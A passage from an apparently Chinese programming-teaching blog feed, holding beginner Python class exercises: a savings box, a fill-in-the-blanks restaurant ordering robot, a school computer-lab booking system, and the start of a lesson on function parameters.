<span class="token builtin">int</span><span class="token punctuation">(</span><span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">'请输入你要存多少钱：'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>money <span class="token operator">=</span> self<span class="token punctuation">.</span>money <span class="token operator">+</span> money        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'你现在一共存了</span><span class="token interpolation"><span class="token punctuation">{</span>self<span class="token punctuation">.</span>money<span class="token punctuation">}</span></span><span class="token string">元'</span></span><span class="token punctuation">)</span>    <span class="token comment"># 取钱</span>    <span class="token keyword">def</span> <span class="token function">drawMoney</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        money <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">'请输入你要取多少钱：'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> self<span class="token punctuation">.</span>money <span class="token operator">&lt;</span> money<span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'抱歉，您太穷了，您没有那么多钱'</span><span class="token punctuation">)</span>            <span class="token keyword">return</span> <span class="token boolean">False</span>        self<span class="token punctuation">.</span>money <span class="token operator">=</span> self<span class="token punctuation">.</span>money <span class="token operator">-</span> money        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'你现在一共存了</span><span class="token interpolation"><span class="token punctuation">{</span>self<span class="token punctuation">.</span>money<span class="token punctuation">}</span></span><span class="token string">元'</span></span><span class="token punctuation">)</span>    <span class="token comment"># 汇率换算</span>    <span class="token keyword">def</span> <span class="token function">exchangeRate</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        dollar <span class="token operator">=</span> <span class="token builtin">round</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>money<span class="token operator">/</span><span class="token number">6.3717</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span>  <span class="token comment"># round(x,y) 对x的前y位四舍五入取整</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'换算成美元是</span><span class="token interpolation"><span class="token punctuation">{</span>dollar<span class="token punctuation">}</span></span><span class="token string">$'</span></span><span class="token punctuation">)</span>        my_moneyBox <span class="token operator">=</span> moneyBox<span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span>my_moneyBox<span class="token punctuation">.</span>menu<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">'按下任意键退出程序'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="项目二、智能点菜机器人"><a href="#项目二、智能点菜机器人" class="headerlink" title="项目二、智能点菜机器人"></a>项目二、智能点菜机器人</h1><p><strong>练习：</strong></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token triple-quoted-string string">'''项目需求：你是一名享誉全球的考古学家，在三星堆的发掘作业中，你发现了一个奇怪的机器，经过研究，这是距今23亿万年前的亚特兰蒂斯文明所遗留的科技。那时的人类已经可以实现自动点菜的功能了，这无疑是一项颠覆世界的发现。但因年代久远，丢失了一些代码片段，你同时作为中职Python首席科学家，需要补全代码'''</span><span class="token comment"># 定义“菜”类</span><span class="token keyword">class</span> <span class="token class-name">dish</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment"># 每道菜有两个属性、菜的名字和价格，每道菜的这两个属性各不相同</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>name<span class="token punctuation">,</span>price<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>name <span class="token operator">=</span> name         self<span class="token punctuation">.</span>price <span class="token operator">=</span> price    <span class="token comment"># 每道菜具有相同的方法、如你所见，即展示自己的菜名和价格，</span>    <span class="token comment"># 因为它已经是一个成熟的“菜”类了，要学会自己介绍自己</span>    <span class="token keyword">def</span> <span class="token function">show_info</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'菜名：</span><span class="token interpolation"><span class="token punctuation">{</span>self<span class="token punctuation">.</span>name<span class="token punctuation">}</span></span><span class="token string">,价格</span><span class="token interpolation"><span class="token punctuation">{</span>self<span class="token punctuation">.</span>price<span class="token punctuation">}</span></span><span class="token string">元'</span></span><span class="token punctuation">)</span> <span class="token comment"># 定义“智能点菜机器人”类</span><span class="token keyword">class</span> <span class="token class-name">orderMachine</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment"># 类初始化时，我们希望他有一个初始的菜单，dish_list里管理的应该是“菜”类的实例化对象</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>dish_list<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>dish_list <span class="token operator">=</span> dish_list        <span class="token comment"># 用户点的菜，这个玩意不需要实例化的时候从外面传，因为这个得靠用户自己点，总不能还没点就有东西吧</span>        self<span class="token punctuation">.</span>user_order_list <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>      <span class="token comment"># 操作菜单（5分）</span>    <span class="token keyword">def</span> <span class="token function">menu</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'今年是超新星纪元305年，欢迎使用亚特兰蒂斯点菜系统：'</span><span class="token punctuation">)</span>        <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>            user_input <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">'请选择：1、查看菜单 2、增加菜单 3、点菜 4、退出系统：'</span><span class="token punctuation">)</span>            <span class="token comment"># 记得看演示程序运行的效果，然后补全</span>        <span class="token comment"># 查看菜单（5分）</span>    <span class="token keyword">def</span> <span class="token function">show_menu</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment"># 记得看演示程序运行的效果，然后补全</span>    <span class="token keyword">if</span> user_input <span class="token operator">==</span> <span class="token string">'1'</span><span class="token punctuation">:</span>            self<span class="token punctuation">.</span>show_menu<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token comment"># 增加菜单（5分）</span>    <span class="token comment"># 此功能最好需要输入密码才可以使用，否则用户万一捣乱，往菜单里添加一个“稀饭煮翔”，岂不糟糕？</span>    <span class="token keyword">def</span> <span class="token function">add_dish</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment"># 记得看演示程序运行的效果，然后补全</span>    <span class="token comment"># 点菜（5分）</span>    <span class="token comment"># 消费 100 元及以上享受 8 折优惠，100 元以下享受每满 10 减 1 优惠”的活动（5分）</span>    <span class="token keyword">def</span> <span class="token function">order_dish</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment"># 记得看演示程序运行的效果，然后补全</span>        <span class="token comment"># “菜”类的实例化</span>dish1 <span class="token operator">=</span> dish<span class="token punctuation">(</span><span class="token string">'红烧排骨'</span><span class="token punctuation">,</span><span class="token number">46</span><span class="token punctuation">)</span>dish2 <span class="token operator">=</span> dish<span class="token punctuation">(</span><span class="token string">'香炸刀鱼'</span><span class="token punctuation">,</span><span class="token number">45</span><span class="token punctuation">)</span>dish3 <span class="token operator">=</span> dish<span class="token punctuation">(</span><span class="token string">'虾仁炒蛋'</span><span class="token punctuation">,</span><span class="token number">68</span><span class="token punctuation">)</span>dish_list <span class="token operator">=</span> <span class="token punctuation">[</span>dish1<span class="token punctuation">,</span>dish2<span class="token punctuation">,</span>dish3<span class="token punctuation">]</span><span class="token comment"># “智能点菜机器人”类的实例化</span>my_orderMachine <span class="token operator">=</span> orderMachine<span class="token punctuation">(</span>dish_list<span class="token punctuation">)</span>my_orderMachine<span class="token punctuation">.</span>menu<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="项目三、机房管理系统"><a href="#项目三、机房管理系统" class="headerlink" title="项目三、机房管理系统"></a>项目三、机房管理系统</h1><h2 id="一、定义“房间”类"><a href="#一、定义“房间”类" class="headerlink" title="一、定义“房间”类"></a>一、定义“房间”类</h2><p>“房间”类就两个属性，房间号和房间名</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">room</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>number<span class="token punctuation">,</span>name<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>number <span class="token operator">=</span> number        self<span class="token punctuation">.</span>name <span class="token operator">=</span> name Room203 <span class="token operator">=</span> room<span class="token punctuation">(</span><span class="token number">203</span><span class="token punctuation">,</span><span class="token string">'网络综合布线工作室'</span><span class="token punctuation">)</span> <span class="token comment"># 实例化对象</span><span class="token keyword">print</span><span class="token punctuation">(</span>Room203<span class="token punctuation">.</span>number<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>Room203<span class="token punctuation">.</span>name<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="二、定义“机房管理系统”类"><a href="#二、定义“机房管理系统”类" class="headerlink" title="二、定义“机房管理系统”类"></a>二、定义“机房管理系统”类</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">room</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>number<span class="token punctuation">,</span>name<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>number <span class="token operator">=</span> number        self<span class="token punctuation">.</span>name <span class="token operator">=</span> name <span class="token keyword">class</span> <span class="token class-name">system</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment"># 菜单</span>    <span class="token keyword">def</span> <span class="token function">menu</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'欢迎使用海盐商贸学校机房管理系统！！！'</span><span class="token punctuation">)</span>        <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>            choice <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">'请选择(1、查看所有机房2、增加机房3、借用机房4、归还机房5、退出)：'</span><span class="token punctuation">)</span>            <span class="token keyword">if</span> choice <span class="token operator">==</span> <span class="token string">'1'</span><span class="token punctuation">:</span>                self<span class="token punctuation">.</span>showAllRoom<span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token keyword">elif</span> choice <span class="token operator">==</span> <span class="token string">'2'</span><span class="token punctuation">:</span>                self<span class="token punctuation">.</span>addRoom<span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token keyword">elif</span> choice <span class="token operator">==</span> <span class="token string">'3'</span><span class="token punctuation">:</span>                self<span class="token punctuation">.</span>borrowRoom<span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token keyword">elif</span> choice <span class="token operator">==</span> <span class="token string">'4'</span><span class="token punctuation">:</span>                self<span class="token punctuation">.</span>returnRoom<span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token keyword">elif</span> choice <span class="token operator">==</span> <span class="token string">'5'</span><span class="token punctuation">:</span>                <span class="token keyword">break</span>HaiYanSystem <span class="token operator">=</span> system<span class="token punctuation">(</span><span class="token punctuation">)</span>HaiYanSystem<span class="token punctuation">.</span>menu<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="三、查看所有机房"><a href="#三、查看所有机房" class="headerlink" title="三、查看所有机房"></a>三、查看所有机房</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">room</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment"># state为借出状态，默认未借出</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>number<span class="token punctuation">,</span>name<span class="token punctuation">,</span>state <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>number <span class="token operator">=</span> number        self<span class="token punctuation">.</span>name <span class="token operator">=</span> name        self<span class="token punctuation">.</span>state <span class="token operator">=</span> state        <span class="token keyword">def</span> <span class="token function">__str__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> self<span class="token punctuation">.</span>state <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>            state_text <span class="token operator">=</span> <span class="token string">'未借用'</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            state_text <span class="token operator">=</span> <span class="token string">'已借用'</span>        <span class="token keyword">return</span> <span class="token string">'机房房间号{},机房名字{},机房借用状态{}'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>number<span class="token punctuation">,</span>self<span class="token punctuation">.</span>name<span class="token punctuation">,</span>state_text<span class="token punctuation">)</span> <span class="token keyword">class</span> <span class="token class-name">system</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">&gt;</span> <span class="token boolean">None</span><span class="token punctuation">:</span>        Room203 <span class="token operator">=</span> room<span class="token punctuation">(</span><span class="token string">'203'</span><span class="token punctuation">,</span><span class="token string">'网络综合布线工作室'</span><span class="token punctuation">)</span>        Room204 <span class="token operator">=</span> room<span class="token punctuation">(</span><span class="token string">'204'</span><span class="token punctuation">,</span><span class="token string">'网络搭建机房'</span><span class="token punctuation">)</span>        Room305 <span class="token operator">=</span> room<span class="token punctuation">(</span><span class="token string">'305'</span><span class="token punctuation">,</span><span class="token string">'Python学习机房'</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>Room_list <span class="token operator">=</span> <span class="token punctuation">[</span>Room203<span class="token punctuation">,</span>Room204<span class="token punctuation">,</span>Room305<span class="token punctuation">]</span>        <span class="token comment"># 菜单</span>    <span class="token keyword">def</span> <span class="token function">menu</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'欢迎使用海盐商贸学校机房管理系统！！！'</span><span class="token punctuation">)</span>        <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>            choice <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">'请选择(1、查看所有机房2、增加机房3、借用机房4、归还机房5、退出)：'</span><span class="token punctuation">)</span>            <span class="token keyword">if</span> choice <span class="token operator">==</span> <span class="token string">'1'</span><span class="token punctuation">:</span>                self<span class="token punctuation">.</span>showAllRoom<span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token keyword">elif</span> choice <span class="token operator">==</span> <span class="token string">'2'</span><span class="token punctuation">:</span>                self<span class="token punctuation">.</span>addRoom<span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token keyword">elif</span> choice <span class="token operator">==</span> <span class="token string">'3'</span><span class="token punctuation">:</span>                self<span class="token punctuation">.</span>borrowRoom<span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token keyword">elif</span> choice <span class="token operator">==</span> <span class="token string">'4'</span><span class="token punctuation">:</span>                self<span class="token punctuation">.</span>returnRoom<span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token keyword">elif</span> choice <span class="token operator">==</span> <span class="token string">'5'</span><span class="token punctuation">:</span>                <span class="token keyword">break</span>    <span class="token comment">#查看所有机房</span>    <span class="token keyword">def</span> <span class="token function">showAllRoom</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> Room <span class="token keyword">in</span> self<span class="token punctuation">.</span>Room_list<span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>Room<span class="token punctuation">)</span>HaiYanSystem <span class="token operator">=</span> system<span class="token punctuation">(</span><span class="token punctuation">)</span>HaiYanSystem<span class="token punctuation">.</span>menu<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="四、增加机房"><a href="#四、增加机房" class="headerlink" title="四、增加机房"></a>四、增加机房</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#增加机房</span><span class="token keyword">def</span> <span class="token function">addRoom</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>    number <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">'请输入房间号：'</span><span class="token punctuation">)</span>    name <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">'请输入机房名：'</span><span class="token punctuation">)</span>    new_room <span class="token operator">=</span> room<span class="token punctuation">(</span>number<span class="token punctuation">,</span>name<span class="token punctuation">)</span>    self<span class="token punctuation">.</span>Room_list<span class="token punctuation">.</span>append<span class="token punctuation">(</span>new_room<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="五、借用机房"><a href="#五、借用机房" class="headerlink" title="五、借用机房"></a>五、借用机房</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#借用机房</span><span class="token keyword">def</span> <span class="token function">borrowRoom</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>    number <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">'请输入你要借用的机房房间号：'</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> room <span class="token keyword">in</span> self<span class="token punctuation">.</span>Room_list<span class="token punctuation">:</span>        <span class="token keyword">if</span> room<span class="token punctuation">.</span>number <span class="token operator">==</span> number<span class="token punctuation">:</span>            <span class="token keyword">if</span> room<span class="token punctuation">.</span>state <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'成功借用机房'</span><span class="token punctuation">)</span>                room<span class="token punctuation">.</span>state <span class="token operator">=</span> <span class="token number">1</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'该机房已被借用'</span><span class="token punctuation">)</span>            <span class="token keyword">break</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'没有该机房'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="六、归还机房"><a href="#六、归还机房" class="headerlink" title="六、归还机房"></a>六、归还机房</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#归还机房</span><span class="token keyword">def</span> <span class="token function">returnRoom</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>    number <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">'请输入你要归还的机房房间号：'</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> room <span class="token keyword">in</span> self<span class="token punctuation">.</span>Room_list<span class="token punctuation">:</span>        <span class="token keyword">if</span> room<span class="token punctuation">.</span>number <span class="token operator">==</span> number<span class="token punctuation">:</span>            <span class="token keyword">if</span> room<span class="token punctuation">.</span>state <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'成功归还机房'</span><span class="token punctuation">)</span>                room<span class="token punctuation">.</span>state <span class="token operator">=</span> <span class="token number">0</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'该机房没被借用'</span><span class="token punctuation">)</span>            <span class="token keyword">break</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'没有该机房'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
            <tag> 项目教学 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python基础语法3—鱼子酱要买多少？</title>
      <link href="/2022/02/20/Python%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%953%E2%80%94%E9%B1%BC%E5%AD%90%E9%85%B1%E8%A6%81%E4%B9%B0%E5%A4%9A%E5%B0%91%EF%BC%9F/"/>
      <url>/2022/02/20/Python%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%953%E2%80%94%E9%B1%BC%E5%AD%90%E9%85%B1%E8%A6%81%E4%B9%B0%E5%A4%9A%E5%B0%91%EF%BC%9F/</url>
      
        <content type="html"><![CDATA[<h1 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h1><h2 id="一、函数"><a href="#一、函数" class="headerlink" title="一、函数"></a>一、函数</h2><h3 id="1-函数的定义与参数传递"><a href="#1-函数的定义与参数传递" class="headerlink" title="1.函数的定义与参数传递"></a>1.函数的定义与参数传递</h3><p>先来创建一个最基本的函数吧</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">study</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'我爱学习编程'</span><span class="token punctuation">)</span> study<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>我们可以传递一些参数进去</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">study</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span>school<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'我的名字叫做</span><span class="token interpolation"><span class="token punctuation">{</span>name<span class="token punctuation">}</span></span><span class="token string">，我在</span><span class="token interpolation"><span class="token punctuation">{</span>school<span class="token punctuation">}</span></span><span class="token string">学习编程'</span></span><span class="token punctuation">)</span> study<span class="token punctuation">(</span><span class="token string">'小明'</span><span class="token punctuation">,</span><span class="token string">'海盐商贸学校'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>当然，参数应该按照顺序放进去，不信就试一下下面这段代码。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">study</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span>school<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'我的名字叫做</span><span class="token interpolation"><span class="token punctuation">{</span>name<span class="token punctuation">}</span></span><span class="token string">，我在</span><span class="token interpolation"><span class="token punctuation">{</span>school<span class="token punctuation">}</span></span><span class="token string">学习编程'</span></span><span class="token punctuation">)</span> study<span class="token punctuation">(</span><span class="token string">'海盐商贸学校'</span><span class="token punctuation">,</span><span class="token string">'小明'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>我们也可以对参数进行指定，不按照顺序传递。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">study</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span>school<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'我的名字叫做</span><span class="token interpolation"><span class="token punctuation">{</span>name<span class="token punctuation">}</span></span><span class="token string">，我在</span><span class="token interpolation"><span class="token punctuation">{</span>school<span class="token punctuation">}</span></span><span class="token string">学习编程'</span></span><span class="token punctuation">)</span> study<span class="token punctuation">(</span>school<span class="token operator">=</span><span class="token string">'海盐商贸学校'</span><span class="token punctuation">,</span>name<span class="token operator">=</span><span class="token string">'小明'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>还可以给参数设置默认的值</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">study</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span>school <span class="token operator">=</span> <span class="token string">'海盐商贸学校'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'我的名字叫做</span><span class="token interpolation"><span class="token punctuation">{</span>name<span class="token punctuation">}</span></span><span class="token string">，我在</span><span class="token interpolation"><span class="token punctuation">{</span>school<span class="token punctuation">}</span></span><span class="token string">学习编程'</span></span><span class="token punctuation">)</span> study<span class="token punctuation">(</span>name<span class="token operator">=</span><span class="token string">'小明'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>默认参数的值是可以修改的</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">study</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span>school <span class="token operator">=</span> <span class="token string">'海盐商贸学校'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'我的名字叫做</span><span class="token interpolation"><span class="token punctuation">{</span>name<span class="token punctuation">}</span></span><span class="token string">，我在</span><span class="token interpolation"><span class="token punctuation">{</span>school<span class="token punctuation">}</span></span><span class="token string">学习编程'</span></span><span class="token punctuation">)</span> study<span class="token punctuation">(</span><span class="token string">'小明'</span><span class="token punctuation">,</span><span class="token string">'清华大学'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>如果不确定参数的数量，我们可以设置一种特殊的不定长参数。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">study</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span>school<span class="token punctuation">,</span><span class="token operator">*</span>course<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'我的名字叫做</span><span class="token interpolation"><span class="token punctuation">{</span>name<span class="token punctuation">}</span></span><span class="token string">，我在</span><span class="token interpolation"><span class="token punctuation">{</span>school<span class="token punctuation">}</span></span><span class="token string">学习</span><span class="token interpolation"><span class="token punctuation">{</span>course<span class="token punctuation">}</span></span><span class="token string">'</span></span><span class="token punctuation">)</span> study<span class="token punctuation">(</span><span class="token string">'小明'</span><span class="token punctuation">,</span><span class="token string">'海盐商贸学校'</span><span class="token punctuation">,</span><span class="token string">'编程'</span><span class="token punctuation">,</span><span class="token string">'数学'</span><span class="token punctuation">)</span><span aria-hidden="true" 